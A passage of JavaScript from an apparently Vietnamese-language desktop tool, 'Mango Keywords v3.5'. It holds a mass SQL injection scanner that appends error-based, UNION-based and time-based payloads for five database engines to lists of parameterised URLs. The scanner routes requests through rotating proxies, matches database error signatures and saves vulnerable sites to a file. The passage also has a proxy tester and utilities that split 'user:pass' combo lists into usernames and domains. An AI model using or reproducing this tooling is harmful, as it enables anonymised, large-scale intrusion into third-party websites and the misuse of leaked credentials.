  mysql: ['you have an error in your sql syntax', 'warning: mysql', 'mysqli', 'mysql_fetch', 'mysql_num_rows', 'supplied argument is not a valid mysql', 'com.mysql.jdbc', 'myssql'],
  mssql: ['unclosed quotation mark', 'quoted string not properly terminated', 'odbc sql server driver', 'sql server', 'mssql_query', 'microsoft ole db provider', 'odbc driver'],
  pgsql: ['pg_query()', 'pg_exec()', 'postgresql', 'psql:', 'unterminated quoted string', 'pg_fetch'],
  oracle: ['ora-01756', 'ora-00933', 'ora-00936', 'ora-00942', 'oracle error', 'quoted string not properly terminated', 'odp.net', 'oracle database'],
  sqlite: ['sqlite3::', 'sqlite3::query', 'sqlite error', 'sqlite_exception', 'sqlite3.operationalerror', 'unrecognized token'],
};
function detectDB(body) {
  body = String(body || '').toLowerCase();
  // check legacy flat list trước để tương thích
  for (const [db, sigs] of Object.entries(DB_SIGS)) {
    const hit = sigs.find(s => body.includes(s));
    if (hit) return { db, sig: hit };
  }
  const hit = SQL_SIGS.find(s => body.includes(s));
  return hit ? { db: 'unknown', sig: hit } : null;
}
function payloadsFor(mode, dbPref) {
  if (mode === 'union') return ["' UNION SELECT 1-- -", "' UNION SELECT 1,2-- -", "' UNION SELECT 1,2,3-- -"];
  if (mode === 'time') {
    if (dbPref === 'mssql') return ["'; WAITFOR DELAY '0:0:3'-- -", "' AND 1=1 WAITFOR DELAY '0:0:3'-- -"];
    if (dbPref === 'pgsql') return ["'; SELECT pg_sleep(3)-- -", "' AND 1=(SELECT pg_sleep(3))-- -"];
    if (dbPref === 'oracle') return ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -"];
    return ["' AND SLEEP(3)-- -", "' OR SLEEP(3)-- -"];
  }
  if (mode === 'db') {
    // full DB: gom basic + union + error-based theo engine
    const base = ["'", '"', "' OR '1'='1", '" OR "1"="1'];
    if (dbPref === 'mysql' || dbPref === 'all') base.push("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -");
    if (dbPref === 'mssql' || dbPref === 'all') base.push("' UNION SELECT 1,@@version-- -");
    if (dbPref === 'pgsql' || dbPref === 'all') base.push("' UNION SELECT 1,version()-- -");
    if (dbPref === 'oracle' || dbPref === 'all') base.push("' UNION SELECT 1,banner FROM v$version-- -");
    if (dbPref === 'sqlite' || dbPref === 'all') base.push("' UNION SELECT 1,sqlite_version()-- -");
    return base;
  }
  return ["'", '"', "' OR '1'='1"];
}
$('btn-start-scanner')?.addEventListener('click', async () => {
  let urls = parseLines($('scanner-input').value).filter(u => u.includes('?'));
  if (!urls.length) { toast('Cần URL có param (?id=…)', 'error'); return; }
  // lọc đuôi nếu có
  const extF = ($('scanner-ext-filter')?.value || '').split(/[,;\s]+/).map(s => s.trim().toLowerCase().replace(/^\./, '')).filter(Boolean);
  if (extF.length) {
    const before = urls.length;
    urls = urls.filter(u => { const m = (u.toLowerCase().match(/\.([a-z0-9]{2,6})(?:[?&#\/]|$)/) || [])[1] || ''; return extF.includes(m); });
    if (!urls.length) { toast(`Không còn URL nào sau lọc đuôi [${extF.join(',')}] (từ ${before} URLs)`, 'error'); return; }
    log(`Scanner lọc đuôi [${extF.join(',')}]: ${before} → ${urls.length} URLs`, 'info');
  }
  const mode = $('scanner-payload').value;
  const dbPref = $('scanner-db')?.value || 'all';
  const payloads = payloadsFor(mode, dbPref);
  const timeout = parseInt($('checker-timeout').value) || 8000;
  const threads = Math.min(20, Math.max(1, parseInt($('checker-threads').value) || 10));
  $('scanner-status').textContent = 'Scanning…'; $('scanner-status').classList.add('running');
  $('scanner-list').innerHTML = ''; const vuln = [];
  const q = [...urls]; let done = 0;
  const dbCount = { mysql: 0, mssql: 0, pgsql: 0, oracle: 0, sqlite: 0, unknown: 0 };
  log(`Scan ${urls.length} URLs | payload ${mode} | db ${dbPref} | ${threads} threads | ${payloads.length} payloads`, 'info');
  await Promise.all(Array.from({ length: threads }, async () => {
    while (q.length) {
      const base = q.shift();
      let isVuln = false, evidence = '', foundDB = '';
      for (const p of payloads) {
        try {
          const px = pickProxy(); const agents = px ? agentFor(px, timeout) : {};
          const res = await axios.get(base + encodeURIComponent(p), {
            timeout, ...agents, validateStatus: () => true,
            headers: { 'User-Agent': 'Mozilla/5.0' },
          });
          const body = String(res.data || '').toLowerCase();
          const det = detectDB(body);
          if (det) { isVuln = true; evidence = det.sig; foundDB = det.db; break; }
          if (mode === 'time') { /* đo trễ: bỏ qua chi tiết */ }
        } catch { /* timeout có thể là time-based — bỏ qua để tránh false positive */ }
      }
      done++;
      $('scanner-bar').style.width = Math.round(done / urls.length * 100) + '%';
      const div = document.createElement('div');
      div.className = 'ritem ' + (isVuln ? 'working' : 'dead');
      const tag = isVuln ? ('VULN' + (foundDB && foundDB !== 'unknown' ? '-' + foundDB.toUpperCase() : '')) : 'OK';
      div.innerHTML = `<span class="tag ${isVuln ? 'working' : 'dead'}">${tag}</span><span class="url">${esc(base)}</span><small>${esc(evidence)}</small>`;
      $('scanner-list').appendChild(div);
      if (isVuln) { vuln.push(base); if (foundDB && dbCount[foundDB] !== undefined) dbCount[foundDB]++; else dbCount.unknown++; }
    }
  }));
  $('scanner-status').textContent = 'Finished'; $('scanner-status').classList.remove('running');
  $('btn-save-vuln').disabled = !vuln.length;
  $('btn-save-vuln').onclick = async () => { const ok = await saveFile(vuln.join('\n'), 'vuln.txt'); if (ok) toast('Đã lưu vuln.txt'); };
  const dbSummary = Object.entries(dbCount).filter(([, v]) => v).map(([k, v]) => `${k}:${v}`).join(' ') || 'không rõ DB';
  log(`Scan xong: ${vuln.length} nghi vấn vuln / ${urls.length} (${dbSummary})`, vuln.length ? 'ok' : 'info');
});

/* ---------- PROXY MANAGER ---------- */
$('btn-proxy-file')?.addEventListener('click', async () => {
  const f = await openFile(); if (!f) return;
  addProxyText(f.content, f.path);
});
function addProxyText(text, src = 'paste') {
  const def = $('proxy-default-type')?.value || 'auto';
  const { proxies, invalid, dup } = parseProxyList(text, def);
  const m = mergeProxies(proxies);
  S.proxyStats.invalid += invalid;
  $('proxy-paste').value = '';
  refreshProxyUI();
  log(`Proxy [${src}]: +${m.added} mới | ${invalid} sai format | ${dup + m.dup} trùng → HTTP:${proxies.filter(p => p.type === 'http').length} S4:${proxies.filter(p => p.type === 'socks4').length} S5:${proxies.filter(p => p.type === 'socks5').length}`, 'info');
  toast(`+${m.added} proxy • ${invalid} lỗi • ${dup + m.dup} trùng`, m.added ? 'ok' : 'warn');
  $('home-invalid').textContent = S.proxyStats.invalid;
}
$('btn-proxy-add-paste')?.addEventListener('click', () => {
  const t = $('proxy-paste').value;
  if (!t.trim()) { toast('Hãy dán proxy trước', 'warn'); return; }
  addProxyText(t, 'paste');
});
$('proxy-paste')?.addEventListener('keydown', (e) => {
  if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') $('btn-proxy-add-paste').click();
});
$('btn-proxy-clear')?.addEventListener('click', () => {
  if (!S.proxies.length) return;
  if (!confirm(`Xóa ${S.proxies.length} proxy?`)) return;
  S.proxies = []; S.rrIndex = 0; S.stickyProxy = null;
  refreshProxyUI(); log('Đã xóa toàn bộ proxy', 'warn');
});
$('btn-proxy-dedupe')?.addEventListener('click', () => {
  const seen = new Set(); const out = [];
  for (const p of S.proxies) if (!seen.has(p.key)) { seen.add(p.key); out.push(p); }
  const removed = S.proxies.length - out.length;
  S.proxies = out; refreshProxyUI();
  toast(removed ? `Đã loại ${removed} trùng` : 'Không có trùng');
});
$('proxy-search')?.addEventListener('input', renderProxyList);
$('proxy-default-type')?.addEventListener('change', () => log('Đổi default type → ' + $('proxy-default-type').value, 'info'));

$('btn-proxy-test')?.addEventListener('click', async () => {
  if (!S.proxies.length) { toast('Chưa có proxy để test', 'warn'); return; }
  const testUrl = $('proxy-test-url').value;
  const timeout = parseInt($('checker-timeout').value) || 8000;
  const threads = Math.min(30, Math.max(1, parseInt($('checker-threads').value) || 10));
  S.stopProxyTest = false;
  $('btn-proxy-test').disabled = true; $('btn-proxy-stop').disabled = false; $('btn-proxy-export-live').disabled = true;
  $('proxy-test-status').textContent = 'Testing…'; $('proxy-test-status').classList.add('running');
  let done = 0, live = 0; const latencies = [];
  const q = [...S.proxies];
  log(`Test ${q.length} proxy → ${testUrl} | ${threads} threads`, 'info');
  await Promise.all(Array.from({ length: threads }, async () => {
    while (q.length && !S.stopProxyTest) {
      const p = q.shift();
      const t0 = Date.now();
      try {
        const agents = agentFor(p, timeout);
        if (!Object.keys(agents).length && p.type !== 'http') throw new Error('missing-agent');
        const res = await axios.get(testUrl, { timeout, ...agents, validateStatus: () => true });
        const ms = Date.now() - t0;
        if (res.status >= 200 && res.status < 400) { p.status = 'live'; p.latency = ms; live++; latencies.push(ms); }
        else { p.status = 'dead'; p.latency = null; }
      } catch { p.status = 'dead'; p.latency = null; }
      done++;
      $('proxy-bar').style.width = Math.round(done / S.proxies.length * 100) + '%';
      $('proxy-live-text').textContent = 'Live: ' + live;
      $('proxy-dead-text').textContent = 'Dead: ' + (done - live);
      if (latencies.length) $('proxy-ms').textContent = 'avg ' + Math.round(latencies.reduce((a, b) => a + b, 0) / latencies.length) + ' ms';
      if (done % 10 === 0) refreshProxyUI();
      await new Promise(r => setTimeout(r, 0));
    }
  }));
  refreshProxyUI();
  $('proxy-test-status').textContent = S.stopProxyTest ? 'Stopped' : 'Finished';
  $('proxy-test-status').classList.remove('running');
  $('btn-proxy-test').disabled = false; $('btn-proxy-stop').disabled = true;
  $('btn-proxy-export-live').disabled = !live;
  log(`Test xong: ${live}/${S.proxies.length} live`, live ? 'ok' : 'warn');
  toast(`Proxy live: ${live}/${S.proxies.length}`, live ? 'ok' : 'warn');
});
$('btn-proxy-stop')?.addEventListener('click', () => { S.stopProxyTest = true; });
$('btn-proxy-export-live')?.addEventListener('click', async () => {
  const live = S.proxies.filter(p => p.status === 'live');
  if (!live.length) return;
  const ok = await saveFile(live.map(p => p.url).join('\n'), 'proxies-live.txt');
  if (ok) toast(`Đã xuất ${live.length} proxy live`);
});

/* ---------- UTILS ---------- */
document.querySelectorAll('[data-util]').forEach(b => b.addEventListener('click', () => {
  const arr = parseLines($('util-input').value);
  let out = [...arr];
  const op = b.getAttribute('data-util');
  if (op === 'dedupe') out = [...new Set(arr)];
  if (op === 'sort') out = [...new Set(arr)].sort();
  if (op === 'clean') out = arr.filter(x => x.trim());
  if (op === 'lower') out = arr.map(x => x.toLowerCase());
  if (op === 'shuffle') out = arr.sort(() => Math.random() - .5);
  $('util-output').value = out.join('\n');
  $('util-count').textContent = out.length;
  log(`Util ${op}: ${arr.length} → ${out.length}`, 'info');
}));
document.querySelectorAll('[data-anti]').forEach(b => b.addEventListener('click', () => {
  const arr = parseLines($('util-input').value);
  const op = b.getAttribute('data-anti');
  let out = arr.filter(x => x.includes(':'));
  if (op === 'domain') out = out.map(x => { const u = x.split('@')[1] || x; return (u.split(':')[0] || '').trim(); });
  if (op === 'user') out = out.map(x => x.split(':')[0].trim());
  out = [...new Set(out.filter(Boolean))];
  $('util-output').value = out.join('\n');
  $('util-count').textContent = out.length;
}));
$('btn-util-copy')?.addEventListener('click', async () => { try { await navigator.clipboard.writeText($('util-output').value); toast('Đã copy'); } catch { toast('Copy thất bại', 'error'); } });
$('btn-util-save')?.addEventListener('click', async () => { const ok = await saveFile($('util-output').value, 'cleaned.txt'); if (ok) toast('Đã lưu'); });
$('btn-export-all')?.addEventListener('click', async () => {
  const data = JSON.stringify({ keywords: S.keywords, params: S.params, generated: S.generated.slice(0, 5000), proxies: S.proxies, scraperUrls: S.scraperUrls.slice(0, 5000) }, null, 2);
  const ok = await saveFile(data, 'session.json'); if (ok) toast('Đã xuất session');
});
$('btn-reset-all')?.addEventListener('click', () => {
  if (!confirm('Reset toàn bộ dữ liệu?')) return;
  Object.assign(S, {
    keywords: [], params: [], generated: [], checkerDorks: [], working: [], dead: [], proxies: [],
    scraperDorks: [], scraperUrls: [], stopScraper: false,
  });
  S.uniqueUrls.clear();
  S.uniqueDomains.clear();
  document.querySelectorAll('textarea').forEach(t => t.value = '');
  if ($('scraper-input')) $('scraper-input').value = '';
  if ($('scraper-list')) $('scraper-list').innerHTML = '<div class="empty">Chưa có kết quả.</div>';
  refreshStats(); refreshProxyUI(); renderCheckerList();
  log('Đã reset session', 'warn');
});

/* init */
// Textarea values are properties rather than DOM text nodes, so a
// MutationObserver cannot retranslate the generated-results suffix.
window.addEventListener('mango:language', () => {
  if (S.generated.length > 200) {
    $('maker-output').value = S.generated.slice(0, 200).join('\n') +
      `\n${tr(`…và ${S.generated.length - 200} dòng nữa (bấm Save để xuất full)`)}`;
  }
});
refreshStats(); refreshProxyUI(); updateParserCount?.();
log('Mango Keywords v3.5 sẵn sàng. Hãy import keywords + proxy để bắt đầu.', 'ok');
log('Proxy hỗ trợ: http/https/socks4/socks5, user:pass@ip:port, ip:port:user:pass, ip:port|user|pass', 'info');
if (!SocksProxyAgent) log('Cảnh báo: thiếu socks-proxy-agent — chạy `npm install` để bật SOCKS5/SOCKS4', 'warn');
if (!HttpProxyAgent) log('Gợi ý: cài http-proxy-agent để tối ưu proxy HTTP', 'warn');
